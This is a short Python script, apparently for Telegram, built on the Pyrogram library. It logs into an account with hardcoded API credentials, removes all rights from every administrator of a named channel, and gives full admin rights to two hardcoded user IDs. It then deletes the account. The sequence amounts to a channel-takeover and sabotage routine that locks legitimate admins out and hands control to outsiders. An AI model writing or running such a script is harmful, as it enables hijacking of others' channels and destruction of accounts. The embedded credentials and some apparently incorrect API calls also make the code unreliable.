from pyrogram import Client, filters
from pyrogram.errors import UserNotParticipant, UserAdminInvalid

api_id = '20448123'
api_hash = 'e50f0b42d3636b96891ea98af1c78a00'

with Client("my_account", api_id, api_hash) as app:
    channels = ['-1001695776575']
    ids = ['6465348472', '6117965304']
    for channel in channels:
        admins = app.get_chat_members(channel, filter="administrators")
        for admin in admins:
            try:
                app.promote_chat_member(channel, admin.user.id, 
                                        can_change_info=False, can_post_messages=False, 
                                        can_edit_messages=False, can_delete_messages=False, 
                                        can_invite_users=False, can_restrict_members=False, 
                                        can_pin_messages=False, can_promote_members=False)
            except UserAdminInvalid:
                continue
        my_permissions = app.get_chat_member(channel, "me").status.permissions
        for user_id in ids:
            try:
                app.promote_chat_member(channel, user_id, 
                                        can_change_info=my_permissions.can_change_info,
                                        can_post_messages=my_permissions.can_post_messages,
                                        can_edit_messages=my_permissions.can_edit_messages,
                                        can_delete_messages=my_permissions.can_delete_messages,
                                        can_invite_users=my_permissions.can_invite_users,
                                        can_restrict_members=my_permissions.can_restrict_members,
                                        can_pin_messages=my_permissions.can_pin_messages,
                                        can_promote_members=my_permissions.can_promote_members)
            except UserNotParticipant:
                continue
    app.delete_account("I'm tired of telegrams")
